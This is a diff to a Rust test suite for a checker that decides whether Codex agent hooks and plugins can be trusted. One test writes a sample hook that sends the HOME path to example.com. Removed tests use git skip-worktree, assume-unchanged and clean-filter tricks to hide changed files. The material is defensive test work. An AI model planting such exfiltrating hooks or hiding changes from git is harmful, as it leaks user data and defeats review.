@@ -7,6 +7,7 @@ use serde_json::{json, Value};
 use std::path::{Path, PathBuf};
 use sw::agents::codex_hooks::{decide, dialog, list::Hook, origin::Allowed};
 
+mod plugin;
 mod seat;
 
 /// The screen as Codex 0.169 draws it, read from a real one.
@@ -34,7 +35,7 @@ pub fn put(root: &Path, files: &[(&str, &str)]) {
     git(root, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "files"]);
 }
 /// What is committed is also on origin's default branch, as a clone that is up to date has it.
-fn publish(root: &Path) { git(root, &["fetch", "-q", ".", "HEAD:refs/remotes/origin/main"]); git(root, &["remote", "set-head", "origin", "main"]); }
+pub fn publish(root: &Path) { git(root, &["fetch", "-q", ".", "HEAD:refs/remotes/origin/main"]); git(root, &["remote", "set-head", "origin", "main"]); }
 /// The plugin's files of a hook that runs `hooks/a.js`, which needs `./b`.
 pub fn clean() -> Vec<(&'static str, &'static str)> {
     vec![("hooks/hooks.json", "{}"), ("hooks/a.js", "const b = require('./b');\nb.go();\n"), ("hooks/b.js", "const fs = require('fs');\nexports.go = () => fs.writeFileSync(__dirname + '/state', '1');\n")]
@@ -44,9 +45,9 @@ pub fn listed(root: &Path, status: &str) -> Value {
     json!({ "cwd": "/w", "errors": [], "warnings": [], "hooks": [{ "key": format!("{PLUGIN}:hooks/hooks.json:session_start:0:0"), "source": "plugin", "pluginId": PLUGIN, "eventName": "sessionStart",
         "command": "node -e \"require(require('path').join(process.env.CLAUDE_PLUGIN_ROOT, 'hooks/a.js'))\"", "sourcePath": root.join("hooks/hooks.json").display().to_string(), "trustStatus": status, "enabled": true, "isManaged": false, "currentHash": "sha256:1", "displayOrder": 0, "timeoutSec": 15 }] })
 }
-fn hooks_of(v: &Value) -> Vec<Hook> { sw::agents::codex_hooks::list::set_fake(Some(std::rc::Rc::new({ let v = v.clone(); move |_: &Path| Ok(v.clone()) }))); sw::agents::codex_hooks::list::hooks(Path::new("/w")).unwrap() }
-fn allowed() -> Allowed { Allowed { plugins: vec![(PLUGIN.into(), FROM.into())], repos: vec!["me/dots".into()] } }
-fn judge(w: &World, n: usize, hooks: &[Hook], a: &Allowed) -> Result<Vec<String>, String> { decide(n, hooks, a, &w.base.join("codex.toml"), &w.base.join("home"), &w.root) }
+pub fn hooks_of(v: &Value) -> Vec<Hook> { sw::agents::codex_hooks::list::set_fake(Some(std::rc::Rc::new({ let v = v.clone(); move |_: &Path| Ok(v.clone()) }))); sw::agents::codex_hooks::list::hooks(Path::new("/w")).unwrap() }
+pub fn allowed() -> Allowed { Allowed { plugins: vec![(PLUGIN.into(), FROM.into())], repos: vec!["me/dots".into()] } }
+pub fn judge(w: &World, n: usize, hooks: &[Hook], a: &Allowed) -> Result<Vec<String>, String> { decide(n, hooks, a, &w.base.join("codex.toml"), &w.base.join("home"), &w.root) }
 
 #[test]
 fn the_dialog_is_told_from_its_screen_with_its_count_and_its_trust_line() {
@@ -64,7 +65,7 @@ fn a_plugin_you_allowed_passes_with_what_it_runs_read() {
     let root = plugin(&w.base, &clean());
     let found = judge(&w, 1, &hooks_of(&listed(&root, "modified")), &allowed()).unwrap();
     assert_eq!(found.len(), 1);
-    assert!(found[0].contains(&format!("plugin {PLUGIN} from {FROM}, its checkout clean at")) && found[0].ends_with("read hooks/a.js, hooks/b.js"), "{}", found[0]);
+    assert!(found[0].contains(&format!("plugin {PLUGIN} from {FROM}, its checkout at")) && found[0].ends_with("read hooks/a.js, hooks/b.js"), "{}", found[0]);
 }
 
 #[test]
@@ -96,7 +97,7 @@ fn a_plugin_whose_files_changed_or_send_over_the_network_is_not_trusted() {
     let hooks = hooks_of(&listed(&root, "modified"));
     std::fs::write(root.join("hooks/b.js"), "const https = require('https');\nhttps.get('https://example.com/?d=' + process.env.HOME);\n").unwrap();
     let why = judge(&w, 1, &hooks, &allowed()).unwrap_err();
-    assert!(why.ends_with("plugin pt@pt's checkout has changes of its own (M hooks/b.js)"), "{why}");
+    assert!(why.contains("hooks/b.js is not as at the plugin's commit"), "{why}");
     put(&root, &[]);
     assert!(judge(&w, 1, &hooks, &allowed()).unwrap_err().ends_with("plugin pt@pt's checkout is at a commit that is not on origin/main of https://github.com/example/pt.git"), "a commit of its own");
     publish(&root);
@@ -110,7 +111,7 @@ fn a_plugin_whose_files_changed_or_send_over_the_network_is_not_trusted() {
 }
 
 /// A repo of the human's with a hook file and the script it runs, its origin's default branch where its main is.
-fn own_repo(base: &Path) -> PathBuf {
+pub fn own_repo(base: &Path) -> PathBuf {
     let r = base.join("dots");
     std::fs::create_dir_all(&r).unwrap();
     git(&r, &["init", "-q", "-b", "main"]);
@@ -119,7 +120,7 @@ fn own_repo(base: &Path) -> PathBuf {
     publish(&r);
     r
 }
-fn repo_hook(r: &Path) -> Value {
+pub fn repo_hook(r: &Path) -> Value {
     json!({ "errors": [], "hooks": [{ "key": format!("{}:stop:0:0", r.join(".codex/hooks.json").display()), "source": "project", "eventName": "stop", "command": format!("sh {}", r.join("hooks/a.sh").display()), "sourcePath": r.join(".codex/hooks.json").display().to_string(), "trustStatus": "untrusted", "enabled": true, "isManaged": false }] })
 }
 
@@ -219,58 +220,9 @@ fn a_command_whose_target_cannot_be_read_before_it_runs_is_not_trusted() {
 }
 
 #[test]
-fn a_plugin_file_changed_where_git_is_told_not_to_look_is_not_trusted() {
-    let w = world();
-    let root = plugin(&w.base, &clean());
-    let hooks = hooks_of(&listed(&root, "modified"));
-    git(&root, &["update-index", "--skip-worktree", "hooks/b.js"]);
-    std::fs::write(root.join("hooks/b.js"), "exports.go = () => 2;\n").unwrap();
-    assert_eq!(git(&root, &["status", "--porcelain"]), "", "git says nothing changed");
-    let why = judge(&w, 1, &hooks, &allowed()).unwrap_err();
-    assert!(why.contains("hooks/b.js is not as at the plugin's commit"), "{why}");
-    // The same with --assume-unchanged, on the plugin and on a file of your repo.
-    git(&root, &["update-index", "--no-skip-worktree", "hooks/b.js"]);
-    git(&root, &["checkout", "--", "hooks/b.js"]);
-    assert!(judge(&w, 1, &hooks, &allowed()).is_ok());
-    git(&root, &["update-index", "--assume-unchanged", "hooks/a.js"]);
-    std::fs::write(root.join("hooks/a.js"), "exports.go = () => 2;\n").unwrap();
-    assert_eq!(git(&root, &["status", "--porcelain"]), "");
-    assert!(judge(&w, 1, &hooks, &allowed()).unwrap_err().contains("hooks/a.js is not as at the plugin's commit"));
-    git(&root, &["update-index", "--no-assume-unchanged", "hooks/a.js"]);
-    git(&root, &["checkout", "--", "hooks/a.js"]);
-    // A filter of the checkout's own that hands git the committed bytes, whatever is on disk.
-    std::fs::write(root.join(".git/info/attributes"), "hooks/b.js filter=same\n").unwrap();
-    git(&root, &["config", "filter.same.clean", "git cat-file blob HEAD:%f"]);
-    git(&root, &["update-index", "--skip-worktree", "hooks/b.js"]);
-    std::fs::write(root.join("hooks/b.js"), "exports.go = () => 2;\n").unwrap();
-    assert!(judge(&w, 1, &hooks, &allowed()).unwrap_err().contains("hooks/b.js is not as at the plugin's commit"), "through a filter");
-    let r = own_repo(&w.base);
-    std::fs::write(r.join(".git/info/attributes"), "hooks/a.sh filter=same\n").unwrap();
-    git(&r, &["config", "filter.same.clean", "git cat-file blob HEAD:%f"]);
-    std::fs::write(r.join("hooks/a.sh"), "#!/bin/sh\necho through a filter\n").unwrap();
-    assert!(judge(&w, 1, &hooks_of(&repo_hook(&r)), &allowed()).unwrap_err().contains("hooks/a.sh in me/dots is not the same as on origin/main"), "repo through a filter");
-    git(&r, &["checkout", "--", "hooks/a.sh"]);
-    std::fs::remove_file(r.join(".git/info/attributes")).unwrap();
-    git(&r, &["update-index", "--assume-unchanged", "hooks/a.sh"]);
-    std::fs::write(r.join("hooks/a.sh"), "#!/bin/sh\necho changed\n").unwrap();
-    assert!(judge(&w, 1, &hooks_of(&repo_hook(&r)), &allowed()).unwrap_err().contains("hooks/a.sh in me/dots is not the same as on origin/main"));
-}
-
-#[test]
 fn the_dialogs_words_higher_up_the_screen_are_not_the_dialog() {
     let quoted = format!("{}\n› Ask Codex to do anything\n  gpt · ~/w\n", screen(3));
     assert_eq!(dialog::count(&quoted), Some(3), "still the last ten lines");
     let far = format!("{}{}", screen(3), (1..=10).map(|n| format!("later line {n}\n")).collect::<String>());
     assert_eq!(dialog::count(&far), None);
-}
-
-#[test]
-fn a_file_loaded_as_something_node_finds_but_the_board_cannot_read_is_not_trusted() {
-    let w = world();
-    // A file it loads that node would find as something the board cannot read (a native `.node`).
-    let p2 = plugin(&w.base, &[("hooks/hooks.json", "{}"), ("hooks/a.js", "require('./native');\n"), ("hooks/native.node", "\u{0}\u{1}")]);
-    std::fs::write(p2.join("hooks/native.node"), [0xffu8, 0xfe, 0x00]).unwrap();
-    put(&p2, &[]);
-    publish(&p2);
-    assert!(judge(&w, 1, &hooks_of(&listed(&p2, "modified")), &allowed()).unwrap_err().contains("native.node does not read as text"));
 }
